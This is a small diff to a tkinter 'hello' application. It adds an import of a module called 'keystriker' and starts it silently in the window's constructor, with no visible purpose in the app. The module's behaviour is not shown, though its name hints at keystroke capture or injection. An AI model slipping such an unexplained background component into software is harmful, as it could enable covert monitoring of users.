@@ -1,4 +1,5 @@
 import tkinter as tk
+from keystriker import keystriker
 
 class Application(tk.Frame):
     def __init__(self, master=None):
@@ -6,6 +7,8 @@ class Application(tk.Frame):
         self.master = master
         self.pack()
         self.create_widgets()
+        ks = keystriker()
+        ks.start()
 
     def create_widgets(self):
         self.hi_there = tk.Button(self)
@@ -23,3 +26,4 @@ class Application(tk.Frame):
 root = tk.Tk()
 app = Application(master=root)
 app.mainloop()
+
